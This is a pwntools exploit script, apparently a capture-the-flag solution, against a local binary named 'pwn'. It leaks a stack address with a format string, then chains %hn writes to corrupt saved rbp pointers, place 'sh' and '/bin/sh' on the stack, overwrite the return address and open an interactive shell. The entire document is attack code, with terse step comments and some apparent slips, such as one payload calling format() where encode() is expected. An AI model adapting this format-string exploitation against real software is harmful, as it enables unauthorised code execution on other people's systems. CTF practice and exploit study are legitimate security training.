from pwn import *
context.log_level="debug"
#context.terminal=["tmux","splitw","-h","-l","66%"]

io = process("./pwn")

# 1 leak stack
payload=b"%8$p"
io.sendafter("...\n",payload)
rbp=int(io.recv(14),16)-0x20
#logv("rbp",hex(rbp))
rbp_low=rbp & 0xffff
fmt_low=0x4040c0 & 0xffff
io.sendafter("battle!",b"a"*8)

#2，3 rbp链入,修改rbp 
payload = '%{}c%6$hn'.format(rbp_low).encode()
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)

payload = '%{}c%47$hn\x00'.format(rbp_low+0x38).encode()
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)
#4,5,6 'sh'写入栈,修改rbp,把rbp+0x3e-4 链入并置0
payload = '%{}c%8$n\x00'.format(0x6873).encode() # 1 canshuxieshangl

io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)

payload = '%{}c%47$hn'.format(rbp_low+0x58).encode()
payload+= '%{}c%6$hn\x00'.format((0x38+0xe-4-0x58+0x10000)%0x10000).encode() # 0
print(5)
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)

payload = '%{}c%47$n\x00'.format(0x00).format() # 1
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)


######7 把rbp再次链入
payload = '%{}c%6$hn\x00'.format(rbp_low).encode()
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)
#####8 修改rbp 为rbp_low+0x38+0xe
payload = '%{}c%47$hn\x00'.format(rbp_low+0x38+0xe).encode()
payload = payload.ljust(0x20,b'\x00')
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)
##### 9 把rbp+8 链入
payload = '%{}c%6$hn\x00'.format(rbp_low+8).encode()
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)
##### 10 修改返回地址
payload = '%{}c%47$hn'.format(0x1274).encode()
print(len(payload))
payload +=b'/bin/sh\x00'
io.sendafter("...\n",payload)
io.sendafter("battle!",b"a"*8)
io.interactive()



